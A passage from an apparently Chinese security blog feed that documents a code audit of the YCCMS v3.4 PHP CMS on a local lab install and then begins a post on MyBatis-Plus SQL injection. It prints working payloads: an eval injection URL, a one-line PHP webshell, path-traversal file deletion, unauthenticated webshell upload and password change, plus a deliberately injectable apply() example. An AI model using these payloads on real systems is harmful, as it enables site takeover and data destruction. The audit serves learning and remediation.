alt="图片"></p></li><li><p>phpstorm左上角file(菜单)-&gt;setting(设置)-&gt;php-&gt;Debug(调试)</p><p>设置端口号为9100，防止端口进程冲突</p><p><img src="/img/yccms/yccms03.png" alt="图片"></p><p>调试下的DBGp按照如图设置，端口与刚刚设置的调试端口相对应</p><p><img src="/img/yccms/yccms04.png" alt="图片"></p><p>打开phpstudy，查看网站使用的php版本</p><p>在软件管理选项中找到对应的php版本，点击设置</p><p>打开xdebug调试组件，端口监听与刚刚设置的调试端口设为一致</p><p><img src="/img/yccms/yccms05.png" alt="图片"></p></li><li><p>phpstorm左上角file(菜单)-&gt;setting(设置)-&gt;php</p><p>将版本设置为与刚刚在phpstudy中查看的此网站使用的php版本</p><p><img src="/img/yccms/yccms06.png" alt="图片"></p></li><li><p>右上角添加配置中选择php网页添加配置</p><p><img src="/img/yccms/yccms07.png" alt="图片"></p></li></ul><h3 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h3><h4 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h4><p><img src="/img/yccms/yccms01.png" alt="图片"></p><p>可以看出此源码是MVC结构，最核心的控制代码在controller与model文件夹内</p><p>翻看目录发现此源码使用了smarty模板，随后可以查看是否存在ssti模板注入</p><h4 id="路由关系"><a href="#路由关系" class="headerlink" title="路由关系"></a>路由关系</h4><ul><li><p>?a&#x3D;admin&amp;m&#x3D;update</p><p>key值为a传入类名，key值为m传入方法名</p></li></ul><h4 id="漏洞复现-有入口，才可利用"><a href="#漏洞复现-有入口，才可利用" class="headerlink" title="漏洞复现(有入口，才可利用)"></a>漏洞复现(有入口，才可利用)</h4><p>参考：<a href="https://www.cnblogs.com/KRookieSec/p/17142265.html">记一次完整的PHP代码审计——yccms v3.4审计 - KRookieSec - 博客园 (cnblogs.com)</a></p><p>​   <a href="https://xz.aliyun.com/news/9362">代码审计—YCCMS系统-先知社区 (aliyun.com)</a></p><p>使用seay进行自动化审计，找到可能存在漏洞的地方，逐个测试</p><p><img src="/img/yccms/yccms08.png" alt="图片"></p><h5 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h5><p>找到此方法是否有被实例化</p><p>发现run.inc.php实例化此方法，admin&#x2F;index.php包含了此文件</p><p>public&#x2F;class目录下的Factory.class.php文件，文件类名为Factory</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">static</span> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setModel</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-variable">$_a</span> = <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">getA</span>();<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(ROOT_PATH.<span class="hljs-string">&#x27;/model/&#x27;</span>.<span class="hljs-variable">$_a</span>.<span class="hljs-string">&#x27;Model.class.php&#x27;</span>)) <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;self::$_obj = new &#x27;</span>.<span class="hljs-title function_ invoke__">ucfirst</span>(<span class="hljs-variable">$_a</span>).<span class="hljs-string">&#x27;Model();&#x27;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">self</span>::<span class="hljs-variable">$_obj</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>eval函数内变量可控</p><p>需要传入一个类名，并且满足(或绕过)file_exists()函数的检查</p><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?a=Factory();phpinfo();//../<br></code></pre></td></tr></table></figure><p>分析：</p><ol><li>调用Factory()类中方法</li><li>用;隔开以执行下一条语句</li><li>&#x2F;..&#x2F;跳至上一级绕过file_exist()函数检测</li></ol><p>顺利注入</p><p><img src="/img/yccms/yccms10.png" alt="图片"></p><p>尝试写入一句话木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?a=Factory();@eval($_POST[v]);//../<br></code></pre></td></tr></table></figure><p>看一些文章是可以顺利连接的，我这里没有成功</p><h5 id="无需登录文件删除"><a href="#无需登录文件删除" class="headerlink" title="无需登录文件删除"></a>无需登录文件删除</h5><p>controller&#x2F;PicAction.class.php文件中控制删除功能的方法没有对文件名及文件路径的检测</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delall</span>(<span class="hljs-params"></span>)</span>&#123; <span class="hljs-comment">// 定义一个公共方法 delall，用于删除图片</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>]))&#123; <span class="hljs-comment">// 如果表单提交了（send 参数存在）</span><br>        <span class="hljs-comment">// 如果 pid 参数为空（即用户没有选择任何图片）</span><br>        <span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pid&#x27;</span>])) <br>            <span class="hljs-comment">// 弹出警告框提示“没有选择任何图片”，然后跳转回 pic 页面</span><br>            tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;没有选择任何图片!&#x27;</span>,<span class="hljs-string">&#x27;?a=pic&#x27;</span>,<span class="hljs-number">7</span>);<br><br>        <span class="hljs-variable">$_fileDir</span> = ROOT_PATH.<span class="hljs-string">&#x27;/uploads/&#x27;</span>; <span class="hljs-comment">// 图片文件所在的目录</span><br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pid&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$_value</span>)&#123; <span class="hljs-comment">// 遍历所有要删除的图片文件名</span><br>            <span class="hljs-variable">$_filePath</span> = <span class="hljs-variable">$_fileDir</span>.<span class="hljs-variable">$_value</span>; <span class="hljs-comment">// 构造完整的文件路径</span><br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$_filePath</span>))&#123; <span class="hljs-comment">// 尝试删除该文件，如果失败</span><br>                <span class="hljs-comment">// 弹出警告框提示“图片删除失败”，建议设置权限为 777</span><br>                tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;图片删除失败,请设权限为777!&#x27;</span>,<span class="hljs-string">&#x27;?a=pic&#x27;</span>,<span class="hljs-number">7</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// 删除成功后，立即重定向回 pic 页面</span><br>                <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:?a=pic&#x27;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>其他文件有文件路径检测，如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_dirPath</span>=<span class="hljs-title function_ invoke__">opendir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>)).<span class="hljs-string">&#x27;\\&#x27;</span>.<span class="hljs-variable">$_navname</span>.<span class="hljs-string">&#x27;\\&#x27;</span>);<br></code></pre></td></tr></table></figure><p>开始测试</p><p>寻找网站功能点：其他功能-&gt;图片管理</p><p>点击删除按钮后抓取数据包，得到数据包内容</p><p><img src="/img/yccms/yccms11.png" alt="图片"></p><p>send值是url编码过的，解码后为删除选中图片</p><p>pid后url编码解码后为[0]</p><p>退出admin账户的登陆后，将网站根目录下CMS系统安装声明文件重命名为CMS(一会测试时无需再对中文url编码)</p><p>更改数据包pid[0]参数的值为&#x2F;..&#x2F;CMS，发送数据包，发现成功删除文件</p><h5 id="无需登录文章删除"><a href="#无需登录文章删除" class="headerlink" title="无需登录文章删除"></a>无需登录文章删除</h5><p>controller&#x2F;ArticleAction.class.php</p><p>漏洞代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delall</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>]))&#123;<br><span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;showid&#x27;</span>])) tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;没有选择任何内容!&#x27;</span>,<span class="hljs-string">&#x27;?a=article&amp;m=index&#x27;</span>,<span class="hljs-number">7</span>);<br><span class="hljs-comment">//$this-&gt;_model-&gt;id=implode(&#x27;,&#x27;,$_POST[&#x27;showid&#x27;]);</span><br><span class="hljs-comment">//echo $this-&gt;_model-&gt;id;</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;showid&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$_value</span>)&#123;<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;id=<span class="hljs-variable">$_value</span>;<br><span class="hljs-variable">$_findOne</span>=<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">findOne</span>();<br><span class="hljs-variable">$html</span>=<span class="hljs-variable">$_findOne</span>[<span class="hljs-number">0</span>]-&gt;html;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$html</span>==<span class="hljs-literal">NULL</span>)&#123;<br><span class="hljs-variable">$html</span>=<span class="hljs-string">&#x27;0.html&#x27;</span>;<br>&#125;<br><span class="hljs-comment">//先删除静态文件</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(ROOT_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$html</span>))&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">unlink</span>(ROOT_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$html</span>))&#123;<br>tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;静态文件删除失败,请设权限为777!&#x27;</span>,<span class="hljs-string">&#x27;?a=article&amp;m=index&#x27;</span>,<span class="hljs-number">5</span>);<br>&#125;<br>&#125;<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">delete_article</span>();<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:&#x27;</span>.tool::<span class="hljs-title function_ invoke__">getPrevPage</span>());<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过代码可以看到基本上是没有检测的，传入id即可删除对应的文章，但是由于变量是固定的，所以只能删除文章</p><p>不能删除其他文件</p><p>开始测试：</p><p>寻找功能点：内容管理-&gt;文章列表</p><p>点击删除抓取数据包</p><p><img src="/img/yccms/yccms13.png" alt="图片"></p><p>看到是直接get传参，更改id的值就可以的</p><p>退出登录后更改id发送数据包，再次登录查看，发现顺利删除文章</p><h5 id="无需登录文件上传01"><a href="#无需登录文件上传01" class="headerlink" title="无需登录文件上传01"></a>无需登录文件上传01</h5><p>public&#x2F;class&#x2F;FileUpload.class.php</p><p>查看源代码发现只对上传图片类型和文件大小做了判断，并且进行了重命名</p><p>在网站寻找功能点：系统设置-&gt;首页内容</p><p>在编辑器自带的文件上传功能点处可以上传文件</p><p>抓取数据包，更改文件名和文件内容，顺利上传</p><p><img src="/img/yccms/yccms14.png" alt="图片"></p><p>用蚁剑成功连接</p><p><img src="/img/yccms/yccms15.png" alt="图片"></p><p>经测试，退出登陆后直接发包也可以正常上传，可以正常连接</p><h5 id="无需登录文件上传02"><a href="#无需登录文件上传02" class="headerlink" title="无需登录文件上传02"></a>无需登录文件上传02</h5><p>直接寻找功能点：系统设置-&gt;上传logo</p><p>找到对应控制代码</p><p><img src="/img/yccms/yccms16.png" alt="图片"></p><p>上传后的文件会被重命名为logo，检验文件类型的函数极容易绕过</p><p>方法同01抓取数据包后更改文件内容与文件名</p><p>可以看到顺利上传</p><p><img src="/img/yccms/yccms17.png" alt="图片"></p><p>用蚁剑测试依旧是能够连接成功</p><p><img src="/img/yccms/yccms18.png" alt="图片"></p><p>退出登录后同样可以发送数据包并且用蚁剑顺利连接</p><h5 id="任意密码修改-未鉴权"><a href="#任意密码修改-未鉴权" class="headerlink" title="任意密码修改(未鉴权)"></a>任意密码修改(未鉴权)</h5><p>controller&#x2F;AdminAction.class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//后台初始</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>])) &#123;<br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]);<br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&#x27;admin/public/admin.tpl&#x27;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">alertLocation</span>(<span class="hljs-literal">null</span>, <span class="hljs-string">&#x27;?a=login&#x27;</span>);<br>&#125;<br><br>&#125;<br><span class="hljs-comment">//修改密码</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>]))&#123;<br><span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>])) <span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">t_back</span>(<span class="hljs-string">&#x27;用户名不能为空&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>);<br><span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) <span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">t_back</span>(<span class="hljs-string">&#x27;密码不能为空!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>);<br><span class="hljs-keyword">if</span>(!(validate::<span class="hljs-title function_ invoke__">checkStrEquals</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;notpassword&#x27;</span>]))) <span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">t_back</span>(<span class="hljs-string">&#x27;两次密码不一致!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>);<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;username=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;password=<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br><span class="hljs-variable">$_edit</span>=<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">editAdmin</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_edit</span>)&#123;<br>tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;密码修改成功!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>,<span class="hljs-number">6</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;密码未修改!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>,<span class="hljs-number">6</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]);<br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&#x27;admin/public/update.tpl&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到登录到后台页面是有鉴权的，但是执行update方法时就没有鉴权了</p><p>在网站找到功能点：其他功能-&gt;修改密码</p><p>抓取数据包，在数据包中做数据的修改</p><p><img src="/img/yccms/yccms19.png" alt="图片"></p><p>网站退出登录后可以正常发送数据包</p><p>尝试新用户名和密码后发现可以正常登录</p><h5 id="rce-Action-class-php-误报"><a href="#rce-Action-class-php-误报" class="headerlink" title="rce(Action.class.php)误报"></a>rce(Action.class.php)误报</h5><p>路径：controller&#x2F;Action.class.php</p><p>调用eval函数，可能存在rce漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-variable">$_m</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>] : <span class="hljs-string">&#x27;index&#x27;</span>;<br><span class="hljs-title function_ invoke__">method_exists</span>(<span class="hljs-variable">$this</span>, <span class="hljs-variable">$_m</span>) ? <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;$this-&gt;&#x27;</span>.<span class="hljs-variable">$_m</span>.<span class="hljs-string">&#x27;();&#x27;</span>) : <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">index</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>查找利用点时发现每一个controller中的文件都继承了此类</p><p>构造payload(<a href="http://localhost/yccms/admin/?a=admin&m=phpinfo)%E5%8F%91%E7%8E%B0%E5%B9%B6%E6%B2%A1%E6%9C%89%E5%9B%9E%E6%98%BE">http://localhost/yccms/admin/?a=admin&amp;m=phpinfo)发现并没有回显</a></p><p>使用动态调试后可以看到m的值初始时为phpinfo</p><p><img src="/img/yccms/yccms09.png" alt="图片"></p><p>经过run.inc.php方法中代码Factory::setAction()-&gt;run();</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 使用工厂模式调用控制器并执行对应方法</span><br><span class="hljs-title class_">Factory</span>::<span class="hljs-title function_ invoke__">setAction</span>()-&gt;<span class="hljs-title function_ invoke__">run</span>();<br></code></pre></td></tr></table></figure><p>m的值被替换为main</p><p>查看setAction方法，此方法中的可控变量是a</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">static</span> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setAction</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$_a</span>=<span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">getA</span>();<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_a</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;nav&#x27;</span>, <span class="hljs-string">&#x27;article&#x27;</span>,<span class="hljs-string">&#x27;backup&#x27;</span>,<span class="hljs-string">&#x27;html&#x27;</span>,<span class="hljs-string">&#x27;link&#x27;</span>,<span class="hljs-string">&#x27;pic&#x27;</span>,<span class="hljs-string">&#x27;search&#x27;</span>,<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;xml&#x27;</span>,<span class="hljs-string">&#x27;online&#x27;</span>))) &#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>])) &#123;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:&#x27;</span>.<span class="hljs-string">&#x27;?a=login&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(ROOT_PATH.<span class="hljs-string">&#x27;/controller/&#x27;</span>.<span class="hljs-title function_ invoke__">ucfirst</span>(<span class="hljs-variable">$_a</span>).<span class="hljs-string">&#x27;Action.class.php&#x27;</span>)) <span class="hljs-variable">$_a</span> = <span class="hljs-string">&#x27;Login&#x27;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;self::$_obj = new &#x27;</span>.<span class="hljs-title function_ invoke__">ucfirst</span>(<span class="hljs-variable">$_a</span>).<span class="hljs-string">&#x27;Action();&#x27;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">self</span>::<span class="hljs-variable">$_obj</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>此代码大致作用：</p><ol><li>获取请求参数 <code>a</code> 来确定控制器；</li><li>若请求的是后台控制器，且用户未登录，则重定向到登录页面；</li><li>若控制器类文件不存在，则默认使用 <code>LoginAction</code>；</li><li>创建控制器类的对象，并返回</li></ol><p>所以无法调用传入的控制器内不存在的方法</p><p>存在eval函数的方法是run方法，像另一个成功执行的rce漏洞一样构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost/yccms/admin/?a=action&amp;m=run();phpinfo();//../#<br></code></pre></td></tr></table></figure><p>仍然无法注入成功</p><p>可以看到在步入run.inc.php后，m的值变为main</p><h5 id="文件包含-run-inc-php-误报"><a href="#文件包含-run-inc-php-误报" class="headerlink" title="文件包含(run.inc.php)误报"></a>文件包含(run.inc.php)误报</h5><p>工具审计时发现了require关键字，可能存在文件包含漏洞</p><p>但是require函数内无可控变量，无法利用此函数</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ol><li><p>自动化工具一般是直接搜索关键字或敏感函数，误报很多</p></li><li><p>找漏洞关键要看漏洞点和利用点，有入口能利用才算漏洞</p></li><li><p>寻找敏感函数和可控变量，查看变量有无过滤，过滤是否可绕过</p></li><li><p>cms漏洞：</p><ul><li>鉴权处理不到位，大部分操作都没有鉴权，无需登录就可操作</li></ul><p>​       修复建议：写出单独的鉴权文件，在每个类中引用</p><ul><li>过滤不严格，对文件名及文件路径几乎无过滤</li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>php代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java代码审计中的sql注入2.0</title>
    <link href="/2025/06/20/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84sql%E6%B3%A8%E5%85%A52.0/"/>
    <url>/2025/06/20/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84sql%E6%B3%A8%E5%85%A52.0/</url>
    
    <content type="html"><![CDATA[<h1 id="Java代码审计中的sql注入2-0"><a href="#Java代码审计中的sql注入2-0" class="headerlink" title="Java代码审计中的sql注入2.0"></a>Java代码审计中的sql注入2.0</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://drun1baby.top/2022/09/14/Java-OWASP-%E4%B8%AD%E7%9A%84-SQL-%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#%E6%80%BB%E7%BB%93-JDBC-%E6%98%93%E4%BA%A7%E7%94%9F%E6%BC%8F%E6%B4%9E%E7%82%B9">Java OWASP 中的 SQL 注入代码审计 | Drunkbaby’s Blog (drun1baby.top)</a></p><p><a href="https://xz.aliyun.com/news/11118">JAVA常用框架SQL注入审计-先知社区 (aliyun.com)</a></p><p><a href="https://blog.csdn.net/qq_38170796/article/details/135398819">预编译真的能完美防御SQL注入吗？_预编译能完全防止sql注入吗-CSDN博客</a></p><p><a href="https://blog.csdn.net/m0_63299495/article/details/145633163">【MyBatis】预编译SQL与即时SQL_mybatis sql预处理-CSDN博客</a></p><p><a href="https://blog.csdn.net/weixin_45537947/article/details/111399311">MyBatis-Plus快速入门-(干货满满+超详细)_mybatis-plus 入门-CSDN博客</a></p><h2 id="Mybatis-Plus-的-SQL-注入探讨"><a href="#Mybatis-Plus-的-SQL-注入探讨" class="headerlink" title="Mybatis-Plus 的 SQL 注入探讨"></a>Mybatis-Plus 的 SQL 注入探讨</h2><h3 id="使用apply直接拼接sql语句"><a href="#使用apply直接拼接sql语句" class="headerlink" title="使用apply直接拼接sql语句"></a>使用apply直接拼接sql语句</h3><h4 id="实际的apply场景"><a href="#实际的apply场景" class="headerlink" title="实际的apply场景"></a>实际的apply场景</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 将此方法绑定到 HTTP 请求路径 /mybatis_plus/mpVuln01</span><br><span class="hljs-meta">@RequestMapping(&quot;/mybatis_plus/mpVuln01&quot;)</span>  <br><span class="hljs-comment">// 定义一个控制器方法，接收两个参数 name 和 id，并返回一个 Employee 对象</span><br><span class="hljs-keyword">public</span> Employee <span class="hljs-title function_">mpVuln01</span><span class="hljs-params">(String name, String id)</span> &#123;  <br>    <span class="hljs-comment">// 创建一个查询条件构造器</span><br>    QueryWrapper&lt;Employee&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();  <br>    <span class="hljs-comment">// 添加等值查询条件：WHERE name = #&#123;name&#125;</span><br>    wrapper.eq(<span class="hljs-string">&quot;name&quot;</span>, name);  <br>    <span class="hljs-comment">// 直接拼接 SQL 片段，变成：AND id=xxx（存在 SQL 注入风险）</span><br>    wrapper.apply(<span class="hljs-string">&quot;id=&quot;</span> + id);  <br>    <span class="hljs-comment">// 执行查询，只返回一条符合条件的记录</span><br>    <span class="hljs-type">Employee</span> <span 